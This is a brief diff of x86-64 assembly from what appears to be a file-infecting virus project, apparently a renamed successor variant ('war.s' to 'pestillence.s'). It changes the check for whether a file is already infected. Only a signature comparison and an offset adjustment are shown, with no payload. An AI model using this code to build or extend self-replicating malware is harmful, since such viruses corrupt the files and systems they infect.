@@ -1,4 +1,4 @@
-%include "war.s"
+%include "pestillence.s"
 
 section .text
   global _start
@@ -43,7 +43,7 @@ _start:
   ; Check whether we are an infected file or not
   lea rsi, [rbp + signature] ; load signature in rsi
   xor r12d, r12d ; init r12 to 0
-  cmp byte [rsi + 1], 'W'; check if we need to adjust offset
+  cmp byte [rsi + 1], 'P'; check if we need to adjust offset
   je .after_adjust
     mov r12d, dev_urandom - v_stop + 1 ; add the difference
   .after_adjust:
